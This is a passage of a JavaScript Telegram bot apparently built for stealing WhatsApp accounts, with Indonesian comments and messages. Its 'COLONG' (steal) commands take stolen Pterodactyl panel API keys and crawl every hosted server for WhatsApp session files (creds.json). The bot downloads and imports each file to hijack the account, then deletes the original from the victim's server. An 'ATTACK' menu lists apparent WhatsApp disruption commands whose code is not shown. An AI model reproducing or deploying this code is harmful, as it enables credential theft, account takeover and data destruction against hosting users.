⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
BYE
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});


(async () => {    
    await validateToken(DatabaseKntol, BOT_TOKEN);
    
    await runOtpGate({ maxAttempts: 3, otpTtlMs: 5 * 60 * 1000 });    
    
    await startAntiModify(bot) 
})();


async function isValideToken(token, DatabaseKntol) {
  try {
    const res = await axios.get(DatabaseKntol, { timeout: 5000 });
    if (!res.data || !Array.isArray(res.data.tokens)) {
      console.warn('Database tidak valid atau format salah');
      return false;
    }

    return res.data.tokens.includes(token);
  } catch (err) {
    console.error('Gagal cek token:', err.message);
    return false;
  }
}

async function isModifiedFile(localPath, GITHUB_URL) {
  try {
    const localFile = fs.readFileSync(localPath, "utf8");
    const { data: githubFile } = await axios.get(GITHUB_URL, { timeout: 5000 });

    const localClean = localFile.trim();
    const githubClean = githubFile.trim();

    if (localClean !== githubClean) {
      console.warn("⚠️ File berbeda dengan versi GitHub!");
      return true; // file dimodifikasi
    }

    console.log("✅ File cocok dengan versi GitHub.");
    return false;
  } catch (err) {
    console.error("Gagal memeriksa file:", err.message);
    return false;
  }
}

async function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
}

// === START MENU ===
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const caption = escapeMd(`
┏━━━━⌦ 𝙺𝚈𝙻𝚇 𝙱𝙰𝚂𝙴 ⌫━━━━━┓
┃ ✦ Username : ${Owner_Username}
┃ ✦ ID Tele : ${OWNER_ID}
┗━━━━━━━━━━━━━━━━━━━━━┛
  `);

  const valid = await isValideToken(BOT_TOKEN, DatabaseKntol);
  const modified = await isModifiedFile("./index.js", "https://raw.githubusercontent.com/syamiiiiii/Majestic/refs/heads/main/index.js"); 
  
  if (!valid || modified) {
    bot.sendMessage(chatId, "TOKEN LU AMPAS");
    for (let i = 0; i < 100; i++) {
      await bot.sendMessage(chatId, "AMPAS LOKKKK");
      await sleep(220);
    }
    process.abort();
  } else {
    bot.sendVideo(chatId, 'https://files.catbox.moe/a9uco3.mp4', {
      caption,
      parse_mode: 'MarkdownV2',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✦ 𝙾𝚆𝙽𝙴𝚁 ✦', callback_data: 'owner_menu' }],
          [{ text: '✦ 𝙲𝙾𝙽𝚃𝚁𝙾𝙻𝙴 ✦', callback_data: 'controle_menu' }],
          [{ text: '✦ 𝙰𝚃𝚃𝙰𝙲𝙺 ✦', callback_data: 'attack_menu' }]
        ]
      }
    });
  }
});

// === CALLBACK HANDLER ===
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  // 1. Cek token dulu
  const valid = await isValideToken(BOT_TOKEN, DatabaseKntol);
  if (!valid) {
    await bot.sendMessage(chatId, "TOKEN LU AMPAS");
    for (let i = 0; i < 100; i++) {  
      await bot.sendMessage(chatId, "AMPAS LOKKKK");
      await sleep(220);
    }
    return process.abort();
  }

  // 2. Token valid → proses menu
  let caption = '';
  let keyboard = [];

  if (data === 'owner_menu') {
    caption = escapeMd(`
┏━━━⌦ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⌫━━━┓
┃ ✧ /XPremium <reply/id>
┃ ✧ /XDelPremium <reply/id>
┃ ✧ /XOwner <reply/id>
┃ ✧ /XDelOwner <reply/id>
┗━━━━━━━━━━━━━━━━━━━━━┛
    `);
    keyboard = [[{ text: '✦ 𝙱𝙰𝙲𝙺 ✦', callback_data: 'back_start' }]];
  } else if (data === 'controle_menu') {
    caption = escapeMd(`
┏━━━⌦ 𝙲𝙾𝙽𝚃𝚁𝙾𝙻𝙴 𝙼𝙴𝙽𝚄 ⌫━━━┓
┃ ✧ /Xcadp <alias>, <plta,pltc,domain>
┃ ✧ /Xdeladp <alias>
┃ ✧ /Xlistadp 
┃ ✧ /Xadp <alias>
┃ ✧ /Xambiladp <alias>
┗━━━━━━━━━━━━━━━━━━━━━┛
    `);
    keyboard = [[{ text: '✦ 𝙱𝙰𝙲𝙺 ✦', callback_data: 'back_start' }]];
  } else if (data === 'attack_menu') {
    caption = escapeMd(`
┏━━━⌦ 𝙰𝚃𝚃𝙰𝙲𝙺 𝙼𝙴𝙽𝚄 ⌫━━━┓
┃ ✧ /XFreze
┃ ✧ /XVisible
┃ ✧ /XInvis
┃ ✧ /XForce
┃ ✧ /XBlank
┗━━━━━━━━━━━━━━━━━━━┛
    `);
    keyboard = [[{ text: '✦ 𝙱𝙰𝙲𝙺 ✦', callback_data: 'back_start' }]];
  } else if (data === 'back_start') {
    caption = escapeMd(`
┏━━━━⌦ 𝙺𝚈𝙻𝚇 𝙱𝙰𝚂𝙴 ⌫━━━━━┓
┃ ✦ Username : ${Owner_Username}
┃ ✦ ID Tele : ${OWNER_ID}
┗━━━━━━━━━━━━━━━━━━━━━┛
    `);
    keyboard = [
      [{ text: '✦ 𝙾𝚆𝙽𝙴𝚁 ✦', callback_data: 'owner_menu' }],
      [{ text: '✦ 𝙲𝙾𝙽𝚃𝚁𝙾𝙻𝙴 ✦', callback_data: 'controle_menu' }],
      [{ text: '✦ 𝙰𝚃𝚃𝙰𝙲𝙺 ✦', callback_data: 'attack_menu' }]
    ];
  }

  if (caption) {
    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'MarkdownV2',
      reply_markup: { inline_keyboard: keyboard }
    });
  }
});


//SENDER MENU
bot.onText(/\/Xsender/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Cek kalau bukan Owner
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "Hanya Owner yang bisa melihat daftar sender!");
  }

  // Ambil daftar dari sessions.json
  let activeList = [];
  try {
    activeList = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"));
  } catch {
    activeList = [];
  }

  if (activeList.length === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada nomor tersimpan di sessions.json.", {
      parse_mode: "Markdown",
    });
  }

  let result = "```LIST SENDER STATUS\n\n";
  let removedCount = 0;

  for (const botNumber of activeList) {
    let statusText = "";
    let isConnected = false;

    // Cek apakah sesi masih ada di memory
    const sockLocal = sessions.get(botNumber);

    // Kalau tidak ada di RAM, coba deteksi folder-nya
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    const hasFolder = fs.existsSync(deviceDir);

    // Cek koneksi
    if (sockLocal && sockLocal.user) {
      statusText = "✅ CONNECTED";
      isConnected = true;
    } else if (!hasFolder) {
      statusText = "❌ FOLDER HILANG";
    } else {
      statusText = "❌ DISCONNECTED";
    }

    // Kalau tidak terhubung, hapus otomatis
    if (!isConnected) {
      try {
        removeActiveSession(botNumber);
        sessions.delete(botNumber);
        if (fs.existsSync(deviceDir)) fs.rmSync(deviceDir, { recursive: true, force: true });
        removedCount++;
      } catch (err) {
        console.error(`Gagal hapus ${botNumber}:`, err.message);
      }
    }

    result += `✦ Nomor  : ${botNumber}\n`;
    result += `✦ Status : ${statusText}\n\n`;
  }

  result += `Total Aktif : ${sessions.size}\n`;
  result += `Total Terhapus Otomatis : ${removedCount}\n`;
  result += "```";

  await bot.sendMessage(chatId, result, { parse_mode: "Markdown" });
});

bot.onText(/\/Xpair(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwnerMain(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Premium!");
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❗️ Wrong usage:\n`/Xpair 62xxxxxxxxxx`", {
            reply_to_message_id: msg.message_id, parse_mode: "Markdown"
        });
    }
    const botNumber = match[1].replace(/[^0-9]/g, "");
    if (botNumber.length < 10) {
        return bot.sendMessage(chatId, "❗️Invalid number.");
    }
    try {
        await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
        console.error("Error in /addsender:", error);
        bot.sendMessage(
            chatId,
            "⚠️ Error connecting to WhatsApp. Please try again."
        );
    }
});


bot.onText(/\/ceksender(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwnerMain(userId)) {
    return bot.sendMessage(chatId, "Hanya Owner yang bisa menggunakan perintah ini!");
  }

  const nomor = match && match[1] ? match[1].replace(/[^0-9]/g, "") : null;

  // Jika tidak ada nomor dikirim, tampilkan semua sesi aktif
  if (!nomor) {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sesi WhatsApp aktif saat ini.");
    }

    let text = "```CEK SENDER LIST\n\n";
    for (const [botNumber, sockLocal] of sessions.entries()) {
      const status = sockLocal?.user ? "✅ TERHUBUNG" : "❌ TERPUTUS";
      text += `✦ Nomor : ${botNumber}\n`;
      text += `✦ Status : ${status}\n\n`;
    }
    text += `Total aktif: ${sessions.size}\n`;

    return bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  }

  // Jika nomor spesifik dikirim, cek koneksinya
  const sockLocal = sessions.get(nomor);
  if (!sockLocal) {
    return bot.sendMessage(chatId, `❌ Nomor *${nomor}* tidak ditemukan dalam sesi aktif.`, { parse_mode: "Markdown" });
  }

  const status = sockLocal?.user ? "✅ TERHUBUNG" : "❌ TERPUTUS";
  const detail = `
\`\`\`
Nomor  : ${nomor}
Status : ${status}
User   : ${sockLocal.user?.id || "Unknown"}
\`\`\`
`;
  return bot.sendMessage(chatId, detail, { parse_mode: "Markdown" });
});


//PANGKAT
bot.onText(/\/Xowner/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "❌ Hanya Owner Utama yang bisa tambah Owner!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /Xowner <id> atau reply user");
  if (isOwner(target)) return bot.sendMessage(msg.chat.id, "User sudah Owner.");
  pangkat.owners.push(String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, `✅ Tambah Owner: ${target}\n\n`);
});

bot.onText(/\/Xdelowner/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, " Hanya Owner Utama yang bisa hapus Owner!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /Xdelowner <id> atau reply user");
  if (!isOwner(target)) return bot.sendMessage(msg.chat.id, "User bukan Owner.");
  if (String(target) === String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, " Tidak bisa hapus Owner Utama!");
  }
  pangkat.owners = pangkat.owners.filter((x) => x !== String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, ` Owner ${target} dihapus\n\n`);
});

bot.onText(/\/XPremium/, (msg) => {
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner yang bisa tambah Premium!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /XPremium <id> atau reply user");
  if (isPremium(target)) return bot.sendMessage(msg.chat.id, "User sudah Premium.");
  pangkat.Premium.push(String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, `Tambah Premium: ${target}\n\n`);
});

bot.onText(/\/XdelPremium/, (msg) => {
  if (String(msg.from.id) !== String(OWNER_ID)) {
    return bot.sendMessage(msg.chat.id, "Hanya Owner Utama yang bisa hapus Premium!");
  }
  const target = getTargetId(msg);
  if (!target) return bot.sendMessage(msg.chat.id, "Gunakan: /xdelPremium <id> atau reply user");
  if (!isPremium(target)) return bot.sendMessage(msg.chat.id, "User bukan Premium.");
  pangkat.Premium = pangkat.Premium.filter((x) => x !== String(target));
  savepangkat(pangkat);
  bot.sendMessage(msg.chat.id, `Premium ${target} dihapus\n\n`);
});







//COLONG MENU
if (typeof okBox === 'undefined') global.okBox = a=>"```"+"✦ Kayla — Ok\n"+a.join("\n")+"```"
if (typeof errBox === 'undefined') global.errBox = a=>"```"+"✦ Kayla — Eror\n"+a.join("\n")+"```"

const AX = axios.create({
  timeout: 20000,
  validateStatus: s => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true })
})

const ADP_DIR  = path.join(__dirname, 'adp')
fs.mkdirpSync(ADP_DIR)
const ADP_FILE = path.join(ADP_DIR, 'adp.json')

function loadADP(){ try{ return JSON.parse(fs.readFileSync(ADP_FILE,'utf8')) }catch{ return {} } }
function saveADP(o){ fs.writeFileSync(ADP_FILE, JSON.stringify(o,null,2)) }
function isPtlc(t){ return typeof t==='string' && /^ptlc_/i.test(t) }
function isPtla(t){ return typeof t==='string' && /^ptla_/i.test(t) }
function asText(x){ return typeof x==='string' ? x : JSON.stringify(x) }
function baseUrl(d){ let u=String(d||'').trim(); if(!/^https?:\/\//i.test(u)) u='https://'+u; return u.replace(/\/+$/,'') }

async function httpGet(url, token){ return AX.get(url, { headers:{ Authorization:`Bearer ${token}` } }) }
async function httpPost(url, token, data){ return AX.post(url, data, { headers:{ Authorization:`Bearer ${token}`, 'Content-Type':'application/json' } }) }

async function fetchAllPages(url, token) {
  let page = 1
  let results = []
  while (true) {
    try {
      const r = await httpGet(`${url}?page=${page}&per_page=50`, token)
      if (r.status !== 200) break
      const data = r.data?.data || []
      if (!data.length) break
      results.push(...data)
      if (!r.data.meta || !r.data.meta.pagination || !r.data.meta.pagination.links?.next) break
      page++
    } catch {
      break
    }
  }
  return results
}

async function listServersClient(b, ptlc){
  const a = await fetchAllPages(`${b}/api/client/servers`, ptlc)
  return a.map(x=>({ id:x.attributes.identifier, name:x.attributes.name||x.attributes.identifier }))
}

async function listServersApplication(b, ptla){
  const a = await fetchAllPages(`${b}/api/application/servers`, ptla)
  return a.map(x=>{
    const at = x.attributes || {}
    return { id:at.identifier||at.uuidShort||at.uuid, name:at.name||at.identifier||at.uuidShort }
  }).filter(x=>x.id)
}

async function listServersWithFallback(b, ptlc, ptla){
  if (isPtlc(ptlc)) { try{ const s=await listServersClient(b, ptlc); if(s.length) return s }catch{} }
  if (isPtla(ptla)) { try{ const s=await listServersApplication(b, ptla); if(s.length) return s }catch{} }
  return []
}

const QUICK_PATHS = [
  '/session/creds.json',
  '/home/container/session/creds.json',
  '/home/container/creds.json',
  '/container/creds.json',
  '/creds.json',
  'creds.json'
]

async function listDirAny(base, ptlc, ptla, sid, dir){
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath){
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  throw new Error('gagal_baca_file')
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath){
  const body = { root:"/", files:[ String(filePath).replace(/^\/+/,'') ] }
  if (isPtlc(ptlc)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body); if(r.status===204||r.status===200) return }catch{} }
  if (isPtla(ptla)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body); if(r.status===204||r.status===200) return }catch{} }
  throw new Error('gagal_hapus_file')
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150){
  for (const qp of QUICK_PATHS){ try{ await readFileAny(base, ptla, ptlc, sid, qp); return [qp] }catch{} }
  const roots = ['/', '/home', '/home/container', '/container', '/root', '/home/container/session', '/home/container/bot', '/home/container/data']
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0, expanded = 0
  while (q.length && depth < maxDepth && expanded < maxDirs){
    const size = q.length
    for (let i=0; i<size && expanded < maxDirs; i++){
      const dir = q.shift()
      expanded++
      let items=[]
      try{ items = await listDirAny(base, ptlc, ptla, sid, dir) }catch{}
      for (const it of items){
        const name = String(it.name || '')
        const isDir = (it.is_file===false)||(it.type==='directory')||(it.directory===true)||(it.is_directory===true)
        if (!isDir){
          if (name.toLowerCase()==='creds.json'){
            const p = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
            return [p]
          }
          continue
        }
        if (name==='.'||name==='..') continue
        const child = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
        if (!seen.has(child)){ seen.add(child); q.push(child) }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0,2)
}

async function writeAndPairFromRaw(raw, chatId){
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))
  try{
    await fs.writeFile(path.join(tmp,'creds.json'), raw)
    const creds = await fs.readJson(path.join(tmp,'creds.json'))
    const me = creds?.me?.id || ''
    if (!me) throw new Error('creds_invalid')
    const n = String(me).split(':')[0]
    const dest = createSessionDir(n)
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    if (typeof saveActiveSessions==='function') saveActiveSessions(n)
    if (typeof connectToWhatsApp==='function') await connectToWhatsApp(n, chatId)
    return n
  } finally { await fs.remove(tmp).catch(()=>{}) }
}

function pLimit(n){
  let a=0, q=[]
  const next=()=>{ if(q.length && a<n){ a++; const {fn,rs,rj}=q.shift(); fn().then(v=>{a--;rs(v);next()}).catch(e=>{a--;rj(e);next()}) } }
  return fn=>new Promise((rs,rj)=>{ q.push({fn,rs,rj}); next() })
}

bot.onText(/^\/Xcadp\s+(\S+)\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa tambah adp!")
  const key = m[1]
  const parts = m[2].split(",").map(s => s.trim())
  if (parts.length < 3) return bot.sendMessage(chatId, errBox(["Format: /Ccadp <alias> <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })
  const [ptla, ptlc, domain] = parts
  const data = loadADP(); data[key] = { ptla, ptlc, domain }; saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' disimpan`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/Xadplist$/i, async msg => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id))
    return bot.sendMessage(chatId, "Hanya Owner yang bisa melihat list adp!")

  const data = loadADP()

  // Fungsi crop teks biar gak kepanjangan
  const crop = (v, max = 25) => {
    if (!v) return "-"
    const s = String(v)
    return s.length > max ? s.slice(0, max) + "…" : s
  }

  const lines = Object.entries(data).map(([k, v]) => {
    const domain = crop(v.domain, 25)
    const ptla = crop(v.ptla, 15)
    const ptlc = crop(v.ptlc, 15)
    return `✦ ${crop(k, 20)} → ${domain}  • ${ptla} • ${ptlc}\n`
  })

  if (!lines.length)
    return bot.sendMessage(chatId, errBox(["(kosong)"]), { parse_mode: "Markdown" })

  // Gabungkan jadi teks besar
  const fullText = okBox(lines)

  // Fungsi untuk memecah pesan sesuai batas Telegram (4096 char)
  const sendInChunks = async (text, chunkSize = 4000) => {
    for (let i = 0; i < text.length; i += chunkSize) {
      const chunk = text.slice(i, i + chunkSize)
      await bot.sendMessage(chatId, chunk, { parse_mode: "Markdown" })
    }
  }

  await sendInChunks(fullText)
})

bot.onText(/^\/Xdeladp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa delete adp!")
  const key = m[1]
  const data = loadADP()
  if (!data[key]) return bot.sendMessage(chatId, errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })
  delete data[key]; saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/Xadp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa menggunakan fitur ini!")
  const key = m[1]
  const cfg = loadADP()[key]
  if (!cfg) return bot.sendMessage(chatId, errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })
  const b = baseUrl(cfg.domain)

  let servers = []
  try {
    servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
    if (!servers.length) return bot.sendMessage(chatId, errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
  } catch (e) {
    const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : (e.message || "gagal")
    return bot.sendMessage(chatId, errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
  }

  let ok = 0, fail = 0, done = 0
  const total = servers.length
  const perServerErrors = []
  const limit = pLimit(20)

  const statusMsg = await bot.sendMessage(chatId, `Sedang Memproses ${total} Panel`, { parse_mode: "Markdown" })

  const updateProgress = async () => {
    const barLen = 10
    const filled = Math.round((done / total) * barLen)
    const bar = "▰".repeat(filled) + "▱".repeat(barLen - filled)
    const lines = [`
✦ Kayla — Proses ✦
Total Server : ${total}
Sudah Scan : ${done}  
Berhasil : ${ok} 
Gagal : ${fail} 
Progress :
[${bar}]
`
    ]
    try { await bot.editMessageText(lines.join("\n"), { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown" }) } catch {}
  }

  await Promise.all(servers.map(s => limit(async () => {
    let paired = false
    try {
      const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
      for (const p of paths) {
        try {
          const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
          const botId = await writeAndPairFromRaw(raw, chatId)
          try { await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p) } catch {}
          ok++; paired = true; break
        } catch {}
      }
      if (!paired) throw new Error("creds_not_found")
    } catch (e) {
      fail++; perServerErrors.push(`✖ ${s.id} ∿ ${e.message || "gagal"}`)
    } finally {
      done++; await updateProgress()
    }
  })))

  const lines = [`✦ Kayla — Selesai\n✔ ${ok} • ✖ ${fail}`]
  if (perServerErrors.length) lines.push(...perServerErrors)
})

bot.onText(/^\/Xcek$/i, async msg => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id))
    return bot.sendMessage(chatId, "Hanya Owner yang bisa melihat list adp!")

  const data = loadADP()

  // Fungsi crop teks biar gak kepanjangan
  const crop = (v, max = 25) => {
    if (!v) return "-"
    const s = String(v)
    return s.length > max ? s.slice(0, max) + "…" : s
  }

  // Susun semua baris data
  const lines = Object.entries(data).map(([k, v]) => {
    const domain = crop(v.domain, 25)
    const ptla = crop(v.ptla, 15)
    const ptlc = crop(v.ptlc, 15)

    // Hitung jumlah server
    let serverCount = 0
    if (Array.isArray(v.servers)) {
      serverCount = v.servers.length
    } else if (typeof v === "object") {
      const serverKeys = Object.keys(v).filter(x => x.toLowerCase().includes("server"))
      serverCount = serverKeys.length
    }

    return `✦ ${crop(k, 20)} → ${domain}  • ${ptla} • ${ptlc} • Server: ${serverCount}\n`
  })

  if (!lines.length)
    return bot.sendMessage(chatId, errBox(["(kosong)"]), { parse_mode: "Markdown" })

  // Gabungkan semua baris ke dalam satu teks
  const fullText = okBox(lines)

  // Kirim dalam potongan (chunk) dengan label lanjutan otomatis
  const sendInChunks = async (text, chunkSize = 4000) => {
    let part = 1
    for (let i = 0; i < text.length; i += chunkSize) {
      const chunk = text.slice(i, i + chunkSize)
      const suffix = i === 0 ? "" : `\n\n(Lanjutan ${part})`
      await bot.sendMessage(chatId, chunk + suffix, { parse_mode: "Markdown" })
      part++
    }
  }

  await sendInChunks(fullText)
})

bot.onText(/^\/ambiladp(?:\s+(\S+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  
  if (typeof infBox === 'undefined') global.infBox = a => "```"+"✦ Kayla — status\n"+a.join("\n")+"```"

